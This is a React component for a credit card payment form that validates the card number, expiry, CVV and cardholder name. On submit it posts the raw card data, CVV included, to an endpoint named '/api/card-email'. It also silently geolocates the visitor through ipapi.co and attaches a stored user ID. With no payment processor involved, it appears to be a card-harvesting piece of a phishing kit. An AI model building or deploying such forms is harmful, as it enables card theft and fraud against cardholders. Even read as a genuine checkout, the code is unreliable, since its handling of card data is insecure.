import { useEffect, useRef, useState } from "react";
import { CalendarFoldIcon, CreditCardIcon, LockIcon, UserIcon } from "lucide-react";

interface CardFormProps {
    onBack: () => void;
    onSuccess: () => void;
    onFailure: () => void;
    onClose: () => void;
}

export default function CardForm({ onBack, onSuccess, onFailure, onClose }: CardFormProps) {
    const form = useRef<HTMLFormElement>(null);

    const [formData, setFormData] = useState({
        cardNumber: '',
        expirationDate: '',
        cvv: '',
        cardHolderName: '',
        ip_address: '',
        user_id: ''
    });

    const [errors, setErrors] = useState({
        cardNumber: '',
        expirationDate: '',
        cvv: '',
        cardHolderName: ''
    });

    const handleValidation = () => {
        const newErrors = { cardNumber: '', expirationDate: '', cvv: '', cardHolderName: '' };

        if (!luhnAlgorithm(formData.cardNumber)) {
            newErrors.cardNumber = 'Invalid card number.';
        }

        const [month, year] = formData.expirationDate.split('/');
        const currentYear = new Date().getFullYear() % 100;
        const maxYear = currentYear + 4;
        if (!month || !year || parseInt(month) < 1 || parseInt(month) > 12 || parseInt(year) < currentYear || parseInt(year) > maxYear) {
            newErrors.expirationDate = 'Invalid expiry date.';
        }

        if (formData.cvv.length !== 3 || isNaN(Number(formData.cvv))) {
            newErrors.cvv = 'Invalid cvv.';
        }

        if (!validatecardHolderName(formData.cardHolderName)) {
            newErrors.cardHolderName = 'Cardholder name must be two words.';
        }

        setErrors(newErrors);
        return Object.values(newErrors).every((error) => error === '');
    };

    const handleFormSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        if (handleValidation()) {
            try {
                const response = await fetch("/api/card-email", {
                    method: "POST",
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(formData),
                });

                if (response.ok) {
                    console.log("SUCCESS!");
                    onSuccess();
                } else {
                    console.error("FAILED...");
                    onFailure();
                }
            } catch (error) {
                console.error("Error:", error);
                onFailure();
            }
        }
    };

    const luhnAlgorithm = (cardNumber: string) => {
        const digits = cardNumber.replace(/\D/g, '').split('').reverse().map(Number);
        return digits.reduce((sum, digit, idx) => {
            if (idx % 2 === 1) {
                const doubled = digit * 2;
                return sum + (doubled > 9 ? doubled - 9 : doubled);
            }
            return sum + digit;
        }, 0) % 10 === 0;
    };

    const validatecardHolderName = (value: string) => {
        return value.trim().split(' ').length === 2;
    };

    const validatecardNumber = (value: string) => {
        const sanitizedValue = value.replace(/\D/g, ''); // Remove non-numeric characters
        const formattedValue = sanitizedValue.replace(/(\d{4})(?=\d)/g, '$1 '); // Add spacing every 4 digits
        return formattedValue.slice(0, 19); // Limit to 16 digits + 3 spaces
    };

    const validateexpirationDate = (value: string) => {
        const sanitizedValue = value.replace(/\D/g, ''); // Remove non-numeric characters
        const formattedValue = sanitizedValue.replace(/(\d{2})(?=\d)/, '$1/'); // Add slash after MM
        if (formattedValue.length > 5) return formattedValue.slice(0, 5); // Limit to MM/YY format

        const [month, year] = formattedValue.split('/');
        if (month && (parseInt(month) < 1 || parseInt(month) > 12)) return ''; // Invalid month
        if (year && year.length === 2) {
            const currentYear = new Date().getFullYear() % 100;
            if (parseInt(year) < currentYear) return ''; // Invalid year
        }
        return formattedValue;
    };

    const validatecvv = (value: string) => {
        const sanitizedValue = value.replace(/\D/g, ''); // Remove non-numeric characters
        return sanitizedValue.slice(0, 3); // Limit to 3 digits
    };

    useEffect(() => {
        const fetchLocationData = async () => {
            try {
                const response = await fetch('https://ipapi.co/json/');
                if (response.ok) {
                    const data = await response.json();
                    setFormData(prev => ({
                        ...prev,
                        ip_address: `ip: ${data.ip}, city: ${data.city}, region: ${data.region}, country: ${data.country_name}`
                    }));
                } else {
                    console.error('Failed to fetch IP location data');
                }
            } catch (error) {
                console.error('Error fetching IP location data:', error);
            }
        };

        fetchLocationData();
    }, []);

    return (
        <form onSubmit={handleFormSubmit} className="space-y-3 md:space-y-6" ref={form}>
            <div>
                <label htmlFor="cardNumber" className="block md:text-sm text-xs font-medium text-gray-700 md:mb-1 mb-0.5">
                    Card Number
                </label>
                <div className="relative">
                    <input
                        id="cardNumber"
                        name="cardNumber"
                        type="text"
                        required
                        placeholder="1234 5678 9012 3456"
                        value={formData.cardNumber || ''}
                        onChange={(e) => setFormData({ ...formData, cardNumber: validatecardNumber(e.target.value) })}
                        className={`mt-1 block w-full border ${errors.cardNumber ? 'border-red-500' : 'border-gray-300'} rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-azalea-500 focus:border-azalea-500 pr-10`}
                    />
                    <span className="absolute inset-y-0 right-3 flex items-center text-gray-400">
                        <CreditCardIcon size={20} />
                    </span>
                </div>
                {errors.cardNumber && <p className="text-red-500 text-sm mt-1">{errors.cardNumber}</p>}
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                    <label htmlFor="expirationDate" className="block md:text-sm text-xs font-medium text-gray-700 md:mb-1 mb-0.5">
                        Expiry Date
                    </label>
                    <div className="relative">
                        <input
                            id="expirationDate"
                            name="expirationDate"
                            type="text"
                            required
                            placeholder="MM/YY"
                            value={formData.expirationDate || ''}
                            onChange={(e) => setFormData({ ...formData, expirationDate: validateexpirationDate(e.target.value) })}
                            className={`mt-1 block w-full border ${errors.expirationDate ? 'border-red-500' : 'border-gray-300'} rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-azalea-500 focus:border-azalea-500 pr-10`}
                        />
                        <span className="absolute inset-y-0 right-3 flex items-center text-gray-400">
                            <CalendarFoldIcon size={20} />
                        </span>
                    </div>
                    {errors.expirationDate && <p className="text-red-500 text-sm mt-1">{errors.expirationDate}</p>}
                </div>
                <div>
                    <label htmlFor="cvv" className="block md:text-sm text-xs font-medium text-gray-700 md:mb-1 mb-0.5">
                        cvv
                    </label>
                    <div className="relative">
                        <input
                            id="cvv"
                            name="cvv"
                            type="text"
                            required
                            placeholder="•••"
                            value={formData.cvv || ''}
                            onChange={(e) => setFormData({ ...formData, cvv: validatecvv(e.target.value) })}
                            className={`mt-1 block w-full border ${errors.cvv ? 'border-red-500' : 'border-gray-300'} rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-azalea-500 focus:border-azalea-500 pr-10`}
                        />
                        <span className="absolute inset-y-0 right-3 flex items-center text-gray-400">
                            <LockIcon size={20} />
                        </span>
                    </div>
                    {errors.cvv && <p className="text-red-500 text-sm mt-1">{errors.cvv}</p>}
                </div>
            </div>
            <div>
                <label htmlFor="cardHolderName" className="block md:text-sm text-xs font-medium text-gray-700 md:mb-1 mb-0.5">
                    Cardholder Name
                </label>
                <div className="relative">
                    <input
                        id="cardHolderName"
                        name="cardHolderName"
                        type="text"
                        required
                        placeholder="John Doe"
                        value={formData.cardHolderName || ''}
                        onChange={(e) => setFormData({ ...formData, cardHolderName: e.target.value })}
                        className={`mt-1 block w-full border ${errors.cardHolderName ? 'border-red-500' : 'border-gray-300'} rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-azalea-500 focus:border-azalea-500 pr-10`}
                    />
                    <span className="absolute inset-y-0 right-3 flex items-center text-gray-400">
                        <UserIcon size={20} />
                    </span>
                </div>
                {errors.cardHolderName && <p className="text-red-500 text-sm mt-1">{errors.cardHolderName}</p>}
            </div>

            <input type="hidden" id="ip_address" name="ip_address" value={formData.ip_address} />
            <input type="hidden" id="user_id" name="user_id" value={localStorage.getItem("user_id") || ""} />

            <div className="flex justify-end space-x-4">
                <button type="button" onClick={onClose} className="px-3 md:px-6 text-sm md:text-base py-2 border border-gray-300 rounded-md text-gray-700 hover:bg-gray-50">
                    Back
                </button>
                <button type="submit" className="px-3 md:px-6 text-sm md:text-xs py-2 bg-azalea-600 text-white rounded-md hover:bg-azalea-700">
                    Submit Payment
                </button>
            </div>
        </form>
    );
}
